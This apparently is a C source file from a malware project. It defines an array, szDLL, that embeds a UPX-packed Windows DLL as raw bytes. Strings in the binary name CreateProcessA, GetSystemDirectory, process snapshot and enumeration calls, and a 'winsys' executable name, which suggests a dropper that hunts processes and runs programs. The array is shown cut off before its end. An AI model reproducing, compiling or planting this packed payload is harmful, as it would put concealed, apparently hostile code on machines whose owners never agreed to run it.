#include "vInclude.h"
#include "vExterns.h"

unsigned char szDLL[3072] =
{
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x66, 0x8C, 0xDE, 0xDA, 0x22, 0xED, 0xB0, 0x89, 0x22, 0xED, 0xB0, 0x89, 0x22, 0xED, 0xB0, 0x89, 
    0xCA, 0xF2, 0xBA, 0x89, 0x26, 0xED, 0xB0, 0x89, 0xCA, 0xF2, 0xB4, 0x89, 0x20, 0xED, 0xB0, 0x89, 
    0x22, 0xED, 0xB1, 0x89, 0x32, 0xED, 0xB0, 0x89, 0x40, 0xF2, 0xA3, 0x89, 0x21, 0xED, 0xB0, 0x89, 
    0xCA, 0xF2, 0xBB, 0x89, 0x23, 0xED, 0xB0, 0x89, 0x52, 0x69, 0x63, 0x68, 0x22, 0xED, 0xB0, 0x89, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x03, 0x00, 
    0x5F, 0x5D, 0x03, 0x43, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x0E, 0x21, 
    0x0B, 0x01, 0x06, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 
    0x80, 0x63, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 
    0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 
    0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x70, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x55, 0x50, 0x58, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0xE0, 0x55, 0x50, 0x58, 0x31, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x10, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xE0, 
    0x55, 0x50, 0x58, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 
    0x00, 0x02, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0x2E, 0x32, 0x35, 0x00, 
    0x55, 0x50, 0x58, 0x21, 0x0C, 0x09, 0x02, 0x0A, 0x4F, 0x60, 0x9F, 0xF5, 0x1B, 0x62, 0xAE, 0x7B, 
    0x9F, 0x42, 0x00, 0x00, 0x7E, 0x03, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x26, 0x00, 0x00, 0x00, 
    0xEE, 0xFF, 0xF6, 0xFF, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x6C, 0x01, 0x00, 0x00, 0xC7, 0x45, 0xFC, 
    0x04, 0x20, 0x10, 0x6A, 0x01, 0x58, 0x85, 0xC0, 0x0F, 0x84, 0x16, 0x11, 0x3F, 0xF7, 0x6F, 0xB7, 
    0x6A, 0x01, 0x02, 0xE8, 0x06, 0x01, 0x5C, 0x89, 0x45, 0xF4, 0x68, 0x28, 0x10, 0x0C, 0x74, 0x59, 
    0x77, 0xBB, 0xC5, 0xFE, 0x89, 0x85, 0x94, 0xFE, 0xFF, 0xFF, 0x8B, 0x05, 0x19, 0xF0, 0x8B, 0x02, 
    0xC7, 0x00, 0x1D, 0xED, 0xF6, 0x6D, 0xFF, 0x80, 0x65, 0xF8, 0x00, 0xFF, 0x75, 0xF0, 0x02, 0xF4, 
    0x27, 0x56, 0x45, 0x74, 0x1B, 0x0B, 0xFF, 0xDB, 0xDF, 0xBB, 0xFC, 0x1E, 0x83, 0xC0, 0x24, 0x50, 
    0x12, 0x6E, 0x59, 0x59, 0x14, 0x75, 0x04, 0xC6, 0x45, 0xF8, 0x01, 0xEB, 0xD6, 0x0F, 0xBB, 0xBB, 
    0xDC, 0xB5, 0xB6, 0x06, 0x68, 0x85, 0x9D, 0x00, 0x68, 0xFF, 0x04, 0x8D, 0x85, 0xA8, 0x50, 0x17, 
    0xAC, 0x79, 0xBB, 0x50, 0xFF, 0x15, 0x8A, 0x10, 0x04, 0x68, 0x1C, 0x11, 0x3A, 0x6B, 0x17, 0xE6, 
    0xCA, 0x68, 0x4B, 0x10, 0x6A, 0xAB, 0x34, 0xB2, 0xDD, 0x3F, 0xAC, 0x98, 0x11, 0x62, 0x83, 0xC4, 
    0x0C, 0x6A, 0x44, 0x12, 0x45, 0xA8, 0x0F, 0x9B, 0xBB, 0x35, 0x5B, 0xD3, 0xB4, 0x24, 0x06, 0xA8, 
    0x44, 0x61, 0x06, 0xD4, 0xF7, 0x86, 0xDD, 0x9A, 0x01, 0x66, 0x07, 0xD8, 0x05, 0x39, 0x2D, 0xE7, 
    0x1B, 0xD8, 0xF7, 0x5E, 0x00, 0x4C, 0x01, 0x78, 0x20, 0x8A, 0x11, 0xC3, 0xDD, 0xB1, 0x76, 0xB8, 
    0x0B, 0x06, 0x0A, 0x14, 0xE9, 0x3D, 0x0C, 0xC9, 0xC3, 0x32, 0xED, 0x85, 0x6F, 0x5B, 0x51, 0xD6, 
    0x0C, 0xFB, 0xFC, 0x83, 0x7D, 0xFC, 0x10, 0x02, 0xEB, 0x0E, 0x9B, 0xDB, 0x0D, 0xEE, 0xB1, 0x08, 
    0x21, 0x10, 0xE8, 0xAD, 0x38, 0x42, 0xC9, 0xC2, 0x0C, 0x33, 0x25, 0x8C, 0x8C, 0x8C, 0x35, 0x08, 
    0x05, 0x0C, 0x1C, 0x20, 0x77, 0xC3, 0x8F, 0x8C, 0x24, 0x28, 0x8B, 0x44, 0x24, 0x08, 0x13, 0x0E, 
    0x39, 0x05, 0x77, 0xBD, 0x70, 0xF7, 0x7D, 0x28, 0x7E, 0x2E, 0xFF, 0x0D, 0x07, 0x8B, 0x05, 0x10, 
    0x38, 0x83, 0x26, 0x8B, 0x09, 0x89, 0xDD, 0x6D, 0xB0, 0xFF, 0x10, 0x2C, 0x75, 0x3F, 0x68, 0x80, 
    0x00, 0x85, 0x34, 0x2F, 0x59, 0xA3, 0x14, 0x34, 0x84, 0xF7, 0xFE, 0x0B, 0x49, 0x33, 0xC0, 0xEB, 
    0x66, 0x83, 0x20, 0x00, 0xA1, 0x0D, 0xB8, 0x36, 0x42, 0xEC, 0x86, 0x6F, 0x00, 0x1C, 0x30, 0x01, 
    0x02, 0xC2, 0xFF, 0x55, 0x29, 0x7B, 0x0D, 0xB1, 0xEE, 0xEB, 0x3D, 0x63, 0x39, 0x26, 0x95, 0x30, 
    0x5E, 0x21, 0xFD, 0xD8, 0xFF, 0x7F, 0x56, 0x8D, 0x71, 0xFC, 0x3B, 0xF0, 0x72, 0x12, 0x8B, 0x0E, 
    0x85, 0xC9, 0x74, 0x07, 0xFF, 0xD1, 0x1E, 0x83, 0xEE, 0x04, 0xEB, 0xEA, 0x9D, 0x73, 0x7F, 0x9F, 
    0xF8, 0x2C, 0x83, 0x25, 0x11, 0x00, 0x59, 0x5E, 0xCF, 0xCE, 0xF5, 0x53, 0xE1, 0xBF, 0xFF, 0xFF, 
    0x8B, 0x5D, 0x08, 0x56, 0x8B, 0x75, 0x0C, 0x57, 0x8B, 0x7D, 0x10, 0x85, 0xF6, 0x75, 0x09, 0x83, 
    0x3D, 0x5F, 0x00, 0xEB, 0x26, 0x83, 0xFE, 0x06, 0xF7, 0x9B, 0xEF, 0x6D, 0x05, 0x04, 0x02, 0x75, 
    0x22, 0x64, 0x38, 0x09, 0x57, 0x56, 0x53, 0xFF, 0xD0, 0x08, 0xD8, 0xE7, 0x1E, 0x4C, 0x0C, 0x8E, 
    0x7A, 0x82, 0xB0, 0x4E, 0x0F, 0xDD, 0xB5, 0x05, 0x37, 0x2F, 0x33, 0x41, 0x0C, 0x4C, 0x17, 0x37, 
    0x57, 0x50, 0x3B, 0x60, 0x7F, 0x83, 0x23, 0xF6, 0x46, 0x03, 0x75, 0x26, 0x34, 0x03, 0x21, 0x25, 
    0xC8, 0x61, 0xB7, 0x42, 0x67, 0x7F, 0x74, 0x11, 0x5B, 0x08, 0x3D, 0x84, 0x37, 0xB8, 0x3C, 0x84, 
    0x5F, 0x5E, 0x5B, 0x5D, 0x6B, 0x30, 0x00, 0x3F, 0x00, 0x44, 0x94, 0x00, 0x77, 0x69, 0x6E, 0x73, 
    0x79, 0x24, 0x2F, 0x00, 0xFF, 0x73, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x5C, 0x4F, 0x20, 0x2D, 
    0x70, 0x02, 0xB2, 0x41, 0x54, 0x0F, 0x7F, 0x79, 0x8E, 0xA2, 0x50, 0x10, 0x01, 0x43, 0x72, 0x65, 
    0x61, 0x74, 0xF6, 0xF6, 0x97, 0xFF, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x41, 0x47, 
    0x65, 0x74, 0x53, 0x79, 0x73, 0x11, 0x6D, 0x44, 0x69, 0x19, 0xD8, 0x1F, 0xCC, 0xFD, 0x63, 0x74, 
    0x6F, 0x72, 0x79, 0x14, 0x1E, 0x33, 0x32, 0x4E, 0x65, 0x78, 0x74, 0x33, 0xE6, 0xFE, 0xED, 0x7F, 
    0x54, 0x6F, 0x6F, 0x6C, 0x68, 0x65, 0x6C, 0x70, 0x15, 0x53, 0x6E, 0x61, 0x70, 0x73, 0x68, 0x6F, 
    0x19, 0x34, 0xBF, 0xFD, 0x6E, 0xFB, 0x73, 0x61, 0x62, 0x6C, 0x1A, 0x68, 0x21, 0x64, 0x4C, 0x69, 
    0x62, 0x72, 0x61, 0x3F, 0x43, 0x61, 0x6C, 0x6C, 0x73, 0x9E, 0x66, 0xBB, 0x6D, 0x1A, 0x53, 0x16, 
    0x65, 0x70, 0x78, 0x5D, 0x1C, 0x6D, 0x1C, 0xEC, 0xCD, 0xDD, 0x62, 0x73, 0x65, 0x32, 0x6B, 0x72, 
    0x63, 0x61, 0x07, 0x6D, 0x70, 0xAD, 0xDC, 0xFE, 0xBF, 0x3F, 0x3F, 0x32, 0x40, 0x59, 0x41, 0x50, 
    0x41, 0x58, 0x49, 0x40, 0x5A, 0x35, 0x66, 0x72, 0x05, 0xAE, 0x39, 0x77, 0xFB, 0x5F, 0x69, 0x6E, 
    0x69, 0x74, 0x71, 0x72, 0x6D, 0x36, 0x4D, 0x8C, 0x12, 0xFF, 0xD8, 0xDF, 0x6E, 0x5F, 0x6A, 0x75, 
    0x33, 0x5F, 0x66, 0x64, 0x69, 0x76, 0x00, 0x00, 0x10, 0x86, 0x05, 0x49, 0x30, 0x0D, 0x0B, 0x7D, 
    0x2B, 0xFF, 0xE7, 0x22, 0x12, 0x06, 0x0E, 0x08, 0x06, 0x0B, 0x0D, 0x08, 0x0E, 0x05, 0x06, 0x0A, 
    0x15, 0x0C, 0x06, 0x43, 0xFE, 0x0B, 0xBF, 0x16, 0x5C, 0x1C, 0x00, 0x50, 0x45, 0x0D, 0x4C, 0x01, 
    0x04, 0x00, 0x5F, 0x5D, 0x03, 0x43, 0xD9, 0x67, 0x47, 0xFE, 0xE0, 0x00, 0x0E, 0x21, 0x0B, 0x01, 
    0x06, 0x00, 0x30, 0x13, 0x29, 0x12, 0x00, 0x0F, 0x6C, 0xF6, 0xBD, 0xD9, 0x20, 0x59, 0x0B, 0x03, 
    0x04, 0x1E, 0x07, 0x26, 0x5D, 0xB0, 0x96, 0x50, 0x27, 0x2A, 0x02, 0x7B, 0x2E, 0x5B, 0xF6, 0x02, 
    0x07, 0x1E, 0x00, 0x40, 0x4F, 0xE5, 0x06, 0x32, 0xAA, 0x3C, 0x6A, 0x40, 0x9F, 0x48, 0xBA, 0x00, 
    0x19, 0x8A, 0x57, 0x40, 0xB2, 0x67, 0x3B, 0x1C, 0x2E, 0x74, 0xB7, 0xA4, 0xCC, 0x10, 0x03, 0xB7, 
    0x85, 0x0F, 0xD9, 0x42, 0x60, 0x2E, 0x72, 0x64, 0x8A, 0x61, 0x10, 0xAA, 0x01, 0x3B, 0x65, 0x13, 
    0x26, 0x03, 0xA2, 0x40, 0x2E, 0x26, 0x94, 0x0C, 0x76, 0x36, 0xCB, 0x30, 0x27, 0x30, 0x36, 0xD9, 
    0x0C, 0xDB, 0xC0, 0x4F, 0x65, 0xAC, 0x10, 0x78, 0x27, 0x59, 0x7E, 0x53, 0x72, 0x40, 0x42, 0x1B, 
    0xBC, 0x20, 0xD3, 0x00, 0x00, 0x00, 0xEE, 0xF6, 0x04, 0x80, 0x04, 0x00, 0x00, 0xFF, 0x00, 0x00, 
    0x80, 0x7C, 0x24, 0x08, 0x01, 0x0F, 0x85, 0x7D, 0x01, 0x00, 0x00, 0x60, 0xBE, 0x00, 0x60, 0x00, 
    0x10, 0x8D, 0xBE, 0x00, 0xB0, 0xFF, 0xFF, 0x57, 0x83, 0xCD, 0xFF, 0xEB, 0x0D, 0x90, 0x90, 0x90, 
    0x8A, 0x06, 0x46, 0x88, 0x07, 0x47, 0x01, 0xDB, 0x75, 0x07, 0x8B, 0x1E, 0x83, 0xEE, 0xFC, 0x11, 
    0xDB, 0x72, 0xED, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x01, 0xDB, 0x75, 0x07, 0x8B, 0x1E, 0x83, 0xEE, 
    0xFC, 0x11, 0xDB, 0x11, 0xC0, 0x01, 0xDB, 0x73, 0xEF, 0x75, 0x09, 0x8B, 0x1E, 0x83, 0xEE, 0xFC, 
    0x11, 0xDB, 0x73, 0xE4, 0x31, 0xC9, 0x83, 0xE8, 0x03, 0x72, 0x0D, 0xC1, 0xE0, 0x08, 0x8A, 0x06, 
    0x46, 0x83, 0xF0, 0xFF, 0x74, 0x74, 0x89, 0xC5, 0x01, 0xDB, 0x75, 0x07, 0x8B, 0x1E, 0x83, 0xEE, 
    0xFC, 0x11, 0xDB, 0x11, 0xC9, 0x01, 0xDB, 0x75, 0x07, 0x8B, 0x1E, 0x83, 0xEE, 0xFC, 0x11, 0xDB, 
    0x11, 0xC9, 0x75, 0x20, 0x41, 0x01, 0xDB, 0x75, 0x07, 0x8B, 0x1E, 0x83, 0xEE, 0xFC, 0x11, 0xDB, 
    0x11, 0xC9, 0x01, 0xDB, 0x73, 0xEF, 0x75, 0x09, 0x8B, 0x1E, 0x83, 0xEE, 0xFC, 0x11, 0xDB, 0x73, 
    0xE4, 0x83, 0xC1, 0x02, 0x81, 0xFD, 0x00, 0xF3, 0xFF, 0xFF, 0x83, 0xD1, 0x01, 0x8D, 0x14, 0x2F, 
    0x83, 0xFD, 0xFC, 0x76, 0x0F, 0x8A, 0x02, 0x42, 0x88, 0x07, 0x47, 0x49, 0x75, 0xF7, 0xE9, 0x63, 
    0xFF, 0xFF, 0xFF, 0x90, 0x8B, 0x02, 0x83, 0xC2, 0x04, 0x89, 0x07, 0x83, 0xC7, 0x04, 0x83, 0xE9, 
    0x04, 0x77, 0xF1, 0x01, 0xCF, 0xE9, 0x4C, 0xFF, 0xFF, 0xFF, 0x5E, 0x89, 0xF7, 0xB9, 0x0E, 0x00, 
    0x00, 0x00, 0x8A, 0x07, 0x47, 0x2C, 0xE8, 0x3C, 0x01, 0x77, 0xF7, 0x80, 0x3F, 0x00, 0x75, 0xF2, 
    0x8B, 0x07, 0x8A, 0x5F, 0x04, 0x66, 0xC1, 0xE8, 0x08, 0xC1, 0xC0, 0x10, 0x86, 0xC4, 0x29, 0xF8, 
    0x80, 0xEB, 0xE8, 0x01, 0xF0, 0x89, 0x07, 0x83, 0xC7, 0x05, 0x89, 0xD8, 0xE2, 0xD9, 0x8D, 0xBE, 
    0x00, 0x40, 0x00, 0x00, 0x8B, 0x07, 0x09, 0xC0, 0x74, 0x3C, 0x8B, 0x5F, 0x04, 0x8D, 0x84, 0x30, 
    0x00, 0x60, 0x00, 0x00, 0x01, 0xF3, 0x50, 0x83, 0xC7, 0x08, 0xFF, 0x96, 0x3C, 0x60, 0x00, 0x00, 
    0x95, 0x8A, 0x07, 0x47, 0x08, 0xC0, 0x74, 0xDC, 0x89, 0xF9, 0x57, 0x48, 0xF2, 0xAE, 0x55, 0xFF, 
    0x96, 0x40, 0x60, 0x00, 0x00, 0x09, 0xC0, 0x74, 0x07, 0x89, 0x03, 0x83, 0xC3, 0x04, 0xEB, 0xE1, 
    0x61, 0x31, 0xC0, 0xC2, 0x0C, 0x00, 0x83, 0xC7, 0x04, 0x8D, 0x5E, 0xFC, 0x31, 0xC0, 0x8A, 0x07, 
    0x47, 0x09, 0xC0, 0x74, 0x22, 0x3C, 0xEF, 0x77, 0x11, 0x01, 0xC3, 0x8B, 0x03, 0x86, 0xC4, 0xC1, 
    0xC0, 0x10, 0x86, 0xC4, 0x01, 0xF0, 0x89, 0x03, 0xEB, 0xE2, 0x24, 0x0F, 0xC1, 0xE0, 0x10, 0x66, 
    0x8B, 0x07, 0x83, 0xC7, 0x02, 0xEB, 0xE2, 0x61, 0xE9, 0x1C, 0xAD, 0xFF, 0xFF, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x70, 0x00, 0x00, 
    0x3C, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x5D, 0x70, 0x00, 0x00, 0x48, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x70, 0x00, 0x00, 
    0x76, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4D, 0x53, 0x56, 
    0x43, 0x52, 0x54, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 
    0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x00, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x66, 0x72, 0x65, 0x65, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x60, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x8D, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
